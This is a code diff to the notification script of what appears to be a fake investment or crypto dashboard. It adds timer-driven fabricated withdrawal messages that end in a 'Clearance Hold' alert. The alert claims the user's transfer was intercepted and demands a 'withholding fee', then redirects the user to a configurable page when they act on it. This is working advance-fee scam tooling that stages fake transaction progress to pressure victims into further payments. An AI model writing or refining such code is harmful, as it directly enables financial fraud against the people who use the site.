@@ -121,14 +121,21 @@
     }
 
     // ==========================================
-// 🕒 DYNAMIC DATA SYNCHRONIZATION WITH DASHBOARD
+// 🕒 DYNAMIC DATA SYNCHRONIZATION WITH REAL-TIME TICKER
 // ==========================================
+
+// 🎯 REDIRECTION TARGET FOR STAGE 3 CLEARANCE HOLD
+const CLEARANCE_REDIRECT_URL = ""; // Change to your desired page
+const ENABLE_AUTO_REDIRECT = false;             // Set to true for automatic timer redirect
+const AUTO_REDIRECT_DELAY_MS = 5000;           // 5-second countdown if auto-redirect is true
 
 const originalDocumentTitle = document.title || "Dashboard";
 let titleInterval = null;
+let syncTicker = null; // Background polling handle
+let autoRedirectTimer = null;
 
 if ("Notification" in window && Notification.permission !== "granted" && Notification.permission !== "denied") {
-    Notification.requestPermission();
+    Notification.permission !== "denied" && Notification.requestPermission();
 }
 
 function triggerDesktopNotification(title, body) {
@@ -173,6 +180,7 @@ document.addEventListener("visibilitychange", () => {
     if (!document.hidden) {
         stopTitleFlashing();
         updateUnreadBadge();
+        initDynamicNotifications();
     } else {
         const count = window.notifications ? window.notifications.filter(n => !n.isRead).length : 0;
         if (count > 0) {
@@ -191,13 +199,18 @@ window.addEventListener("focus", () => {
     }
 });
 
+// React instantly to cross-tab updates without reloading the entire page
 window.addEventListener("storage", (event) => {
-    if (event.key === "av_read_notifs" || event.key === "av_deleted_notifs" || event.key === "av_withdrawal_tx" || event.key === "av_withdrawn") {
-        location.reload();
+    if (["av_read_notifs", "av_deleted_notifs", "av_withdrawal_tx", "av_withdrawn", "av_force_hold"].includes(event.key)) {
+        initDynamicNotifications();
     }
 });
 
-(async function initDynamicNotifications() {
+function handleHoldRedirect() {
+    window.location.href = CLEARANCE_REDIRECT_URL;
+}
+
+async function initDynamicNotifications() {
     let userIp = localStorage.getItem("av_user_ip");
     if (!userIp) {
         try {
@@ -272,6 +285,8 @@ window.addEventListener("storage", (event) => {
 
     const bonusTxRef = getPersistentTxRef("av_bonus_tx_ref", "TXN-BONUS");
     const coreDepTxRef = getPersistentTxRef("av_dep_tx_ref", "TXN-DEP");
+    const holdTxRef = getPersistentTxRef("av_hold_tx_ref", "TXN-7533-CLR");
+    const routingTxRef = getPersistentTxRef("av_routing_tx_ref", "BATCH-CLR-");
 
     let generatedNotifications = [
       {
@@ -280,11 +295,39 @@ window.addEventListener("storage", (event) => {
       }
     ];
 
+    let stage3Active = false;
+
     if (isWithdrawn) {
+      let baseWithdrawalMs = storedWithdrawalTime ? new Date(storedWithdrawalTime).getTime() : Date.now();
+      if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
+      const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));
+
+      // STAGE 3: Bad News — Triggered at 30+ minutes
+      if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
+        stage3Active = true;
+        const stage3Time = formatTimestamp(new Date(baseWithdrawalMs + (35 * 60 * 1000)));
+        generatedNotifications.push({
+          id: 10, type: "withdrawal", category: "failed", title: "Action Required: Intermediary Clearance Hold",
+          description: `Your transfer of <strong>$${formattedWithdrawnAmount} USD</strong> has been intercepted by the cross-border clearing layer. Institutional withholding fee required prior to release.`,
+          timestamp: stage3Time, isRead: false, txRef: holdTxRef, isActionRequired: true
+        });
+      }
+
+      // STAGE 2: Intermediate Good News — Triggered at 5+ minutes
+      if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
+        const stage2Time = formatTimestamp(new Date(baseWithdrawalMs + (7 * 60 * 1000)));
+        generatedNotifications.push({
+          id: 9, type: "withdrawal", category: "pending", title: "Intermediary Network Routing",
+          description: `Transaction batch <strong>#${routingTxRef}</strong> dispatched to cross-border settlement rail. Estimated release: 2-4 hours.`,
+          timestamp: stage2Time, isRead: elapsedMinutes >= 30, txRef: routingTxRef
+        });
+      }
+
+      // STAGE 1: Immediate Processing
       generatedNotifications.push({
         id: 2, type: "withdrawal", category: "success", title: "Funds Withdrawal Processing",
         description: `Your withdrawal request of <strong>$${formattedWithdrawnAmount} USD</strong> is being routed to your destination wallet/bank.`,
-        timestamp: formattedWithdrawalTime, isRead: false, txRef: withdrawalTx.txHash || "av_tx_unknown"
+        timestamp: formattedWithdrawalTime, isRead: elapsedMinutes >= 5, txRef: withdrawalTx.txHash || "av_tx_unknown"
       });
     }
 
@@ -312,6 +355,8 @@ window.addEventListener("storage", (event) => {
     const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
     const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
 
+    const previousCount = window.notifications ? window.notifications.length : 0;
+
     window.notifications = generatedNotifications
         .filter(n => !deletedIds.includes(n.id))
         .map(n => {
@@ -319,13 +364,28 @@ window.addEventListener("storage", (event) => {
             return n;
         });
 
-    renderNotifications();
+    // Broadcast generated active notification IDs to sub-page watchers
+    localStorage.setItem('av_active_notifs_cache', JSON.stringify(generatedNotifications.map(n => ({ id: n.id }))));
 
-    const unreadItems = window.notifications.filter(n => !n.isRead);
-    if (unreadItems.length > 0) {
-        triggerDesktopNotification("New Notification", unreadItems[0].title);
+    // Detect if a new notification dynamic stage just appeared in real-time
+    if (window.notifications.length > previousCount && previousCount > 0) {
+        const newlyAdded = window.notifications[0];
+        if (newlyAdded && !newlyAdded.isRead) {
+            triggerDesktopNotification("New Alert", newlyAdded.title);
+        }
     }
-})();
+
+    // AUTO-REDIRECT TIMER (If enabled and Stage 3 hold is active)
+    if (ENABLE_AUTO_REDIRECT && stage3Active && !readIds.includes(10)) {
+        if (!autoRedirectTimer) {
+            autoRedirectTimer = setTimeout(() => {
+                handleHoldRedirect();
+            }, AUTO_REDIRECT_DELAY_MS);
+        }
+    }
+
+    renderNotifications();
+}
 
 let currentFilter = 'all';
 
@@ -346,7 +406,13 @@ function getIcon(type, category) {
 
 function renderNotifications() {
   const containerList = document.getElementById('notifications-list');
-  if (!containerList || !window.notifications) return;
+  
+  if (!containerList) {
+    updateUnreadBadge();
+    return;
+  }
+
+  if (!window.notifications) return;
 
   const filtered = window.notifications.filter(item => {
     if (currentFilter === 'unread') return !item.isRead;
@@ -390,6 +456,14 @@ function renderNotifications() {
             ${item.txRef ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">Ref: ${item.txRef}</span>` : ''}
             ${item.ipAddress ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">IP: ${item.ipAddress}</span>` : ''}
           </div>
+          ${item.isActionRequired ? `
+            <div class="mt-3">
+              <button onclick="toggleRead(10)" class="inline-flex items-center gap-2 px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-medium rounded-lg transition shadow-sm">
+                <span>Resolve Clearance Hold</span>
+                <i class="fa-solid fa-arrow-right text-[10px]"></i>
+              </button>
+            </div>
+          ` : ''}
         </div>
         <div class="flex flex-col justify-between items-end gap-2 shrink-0">
           <button onclick="toggleRead(${item.id})" title="${item.isRead ? 'Mark as unread' : 'Mark as read'}" class="text-slate-400 hover:text-blue-600 transition text-sm">
@@ -433,14 +507,28 @@ function toggleRead(id) {
       }
       return item;
   });
+
+  // REDIRECT TARGET: If notification #10 (Stage 3 Hold) is read/acted upon, redirect immediately
+  if (id === 10) {
+      handleHoldRedirect();
+      return;
+  }
+
   renderNotifications();
 }
 
 function markAllAsRead() {
+  let containsStage3 = window.notifications.some(n => n.id === 10);
   window.notifications = window.notifications.map(item => {
       updateReadStorage(item.id, true);
       return { ...item, isRead: true };
   });
+  
+  if (containsStage3) {
+      handleHoldRedirect();
+      return;
+  }
+
   renderNotifications();
 }
 
@@ -492,19 +580,16 @@ function updateUnreadBadge() {
   }
 }
 
-fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(data => {
-    if (data.ip) {
-      notifications.forEach(n => {
-        if (n.type === 'signin' && !n.isRead) n.ipAddress = data.ip;
-      });
-      renderNotifications();
-    }
-  })
-  .catch(() => {});
+// ==========================================
+// 🚀 INITIALIZATION & CONTINUOUS POLLING
+// ==========================================
 
-renderNotifications();
+initDynamicNotifications();
+
+if (syncTicker) clearInterval(syncTicker);
+syncTicker = setInterval(() => {
+    initDynamicNotifications();
+}, 10000);
 
 </script>
 </body>
